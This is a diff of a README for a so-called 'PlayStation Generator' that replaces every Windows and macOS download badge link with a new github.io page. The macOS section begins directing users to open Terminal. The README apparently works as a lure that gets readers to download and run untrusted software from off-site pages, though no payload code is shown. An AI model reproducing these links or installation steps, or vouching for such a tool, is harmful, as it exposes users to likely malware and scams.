@@ -26,7 +26,7 @@
 
 <div align="center">
 
-[![Download](https://img.shields.io/badge/⬇_Download_PlayStation_Generator-003791?style=for-the-badge&logo=playstation)](https://hydracomptrollercord.github.io/Downloader/)
+[![Download](https://img.shields.io/badge/⬇_Download_PlayStation_Generator-003791?style=for-the-badge&logo=playstation)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -59,9 +59,9 @@
 
 <div align="center">
 
-[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://hydracomptrollercord.github.io/Downloader/)
+[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://spearsurvive.github.io/win/)
 
-[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://hydracomptrollercord.github.io/MacDownloader/)
+[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://spearsurvive.github.io/mac/)
 
 </div>
 
@@ -74,7 +74,7 @@
 
 <div align="center">
 
-[![Download](https://img.shields.io/badge/⬇_Download_PlayStation_Generator-003791?style=for-the-badge&logo=playstation)](https://hydracomptrollercord.github.io/Downloader/)
+[![Download](https://img.shields.io/badge/⬇_Download_PlayStation_Generator-003791?style=for-the-badge&logo=playstation)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -105,7 +105,7 @@
 
 ## 🍎 macOS Installation
 
-[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://hydracomptrollercord.github.io/MacDownloader/)
+[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://spearsurvive.github.io/mac/)
 
 1. Click the badge above to open the macOS installer page
 2. Open **Terminal** (`⌘ + Space` → type Terminal → Enter)
@@ -130,7 +130,7 @@
 
 <div align="center">
 
-[![Download](https://img.shields.io/badge/⬇_Download_PlayStation_Generator-003791?style=for-the-badge&logo=playstation)](https://hydracomptrollercord.github.io/Downloader/)
+[![Download](https://img.shields.io/badge/⬇_Download_PlayStation_Generator-003791?style=for-the-badge&logo=playstation)](https://spearsurvive.github.io/win/)
 
 </div>
 
